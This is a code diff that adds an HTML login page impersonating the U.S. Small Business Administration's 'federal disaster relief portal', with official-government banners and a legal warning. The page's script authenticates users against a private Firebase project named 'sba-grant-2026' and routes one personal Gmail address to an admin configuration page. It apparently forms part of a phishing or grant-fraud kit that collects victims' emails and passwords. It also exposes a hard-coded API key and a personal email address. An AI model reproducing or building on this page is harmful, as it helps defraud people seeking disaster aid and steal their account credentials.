@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SBA Portal | 2026 Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body style="background: #f1f5f9;">
+    <div class="gov-banner">
+        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
+        OFFICIAL U.S. GOVERNMENT SYSTEM - FISCAL YEAR 2026
+    </div>
+
+    <div class="nav" style="background: #1e3a8a; padding: 15px; text-align: center;">
+        <h1 style="margin:0; color: white; font-size: 18px; letter-spacing: 2px;">SBA.GOV</h1>
+    </div>
+
+    <div class="container">
+        <div class="card" style="margin-top: 30px; border-radius: 12px; box-shadow: 0 10px 25px -5px rgba(0,0,0,0.1);">
+            <div style="text-align: center; margin-bottom: 25px;">
+                <h2 style="font-size: 22px; color: #1e3a8a; margin-bottom: 5px;">System Login</h2>
+                <p style="font-size: 13px; color: #64748b;">Access your 2026 federal disaster relief portal.</p>
+            </div>
+            
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Email Address</label>
+            <input type="email" id="email" placeholder="name@domain.com" style="width:100%; padding:14px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:15px; box-sizing:border-box;">
+
+            <label style="display:block; font-size:12px; font-weight:bold; color:#1e293b; margin-bottom:5px;">Password</label>
+            <input type="password" id="password" placeholder="••••••••" style="width:100%; padding:14px; border-radius:8px; border:1px solid #cbd5e1; margin-bottom:20px; box-sizing:border-box;">
+
+            <button id="loginBtn" style="background: #1e3a8a; color: white; padding: 16px; border-radius: 10px; width: 100%; font-weight: 800; border: none; cursor: pointer; text-transform: uppercase; letter-spacing: 1px;">
+                Login to Portal
+            </button>
+            
+            <div style="text-align:center; margin-top:20px; font-size: 14px;">
+                New applicant? <a href="register.html" style="color: #1e3a8a; font-weight: bold; text-decoration: none;">Create an account</a>
+            </div>
+
+            <div style="text-align:center; margin-top:15px; font-size: 12px;">
+                <a href="forgot-password.html" style="color: #64748b; text-decoration: none;">Trouble logging in? Reset Access</a>
+            </div>
+        </div>
+        
+        <div style="max-width: 400px; margin: 30px auto; border-top: 1px solid #cbd5e1; padding-top: 20px;">
+            <p style="text-align: center; font-size: 10px; color: #94a3b8; line-height: 1.4;">
+                <b>SECURE ACCESS WARNING:</b> Unauthorized access to this system is strictly prohibited by Public Law 99-474 (The Computer Fraud and Abuse Act). All activities are monitored and logged for 2026 compliance audits.
+            </p>
+        </div>
+    </div>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+        import { getAuth, signInWithEmailAndPassword, reload } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
+            authDomain: "sba-grant-2026.firebaseapp.com",
+            projectId: "sba-grant-2026",
+            storageBucket: "sba-grant-2026.firebasestorage.app",
+            messagingSenderId: "838430821326",
+            appId: "1:838430821326:web:6438deacb334076a64f99f"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const auth = getAuth(app);
+        const loginBtn = document.getElementById('loginBtn');
+
+        loginBtn.addEventListener('click', async () => {
+            const email = document.getElementById('email').value.trim();
+            const pass = document.getElementById('password').value;
+
+            if(!email || !pass) return alert("Please enter both email and password.");
+
+            loginBtn.innerText = "ESTABLISHING SECURE SESSION...";
+            loginBtn.disabled = true;
+
+            try {
+                const res = await signInWithEmailAndPassword(auth, email, pass);
+                const user = res.user;
+
+                // 1. Check for Admin Access first
+                if (email === "liger4683@gmail.com") {
+                    window.location.href = 'system-config-v8.html';
+                    return;
+                }
+
+                // 2. Force a reload to check the latest emailVerified status
+                await reload(user);
+
+                // 3. Security gate: Verified users go to welcome, others to verify page
+                if (user.emailVerified) {
+                    window.location.href = 'welcome.html';
+                } else {
+                    window.location.href = 'verify.html';
+                }
+
+            } catch(err) {
+                let msg = "The credentials provided do not match our 2026 records.";
+                if(err.code === 'auth/too-many-requests') msg = "System lockout due to too many attempts. Please try later.";
+                if(err.code === 'auth/invalid-credential' || err.code === 'auth/user-not-found' || err.code === 'auth/wrong-password') msg = "Invalid email or password.";
+                
+                alert("ACCESS DENIED: " + msg);
+                loginBtn.innerText = "Login to Portal";
+                loginBtn.disabled = false;
+            }
+        });
+    </script>
+</body>
+</html>
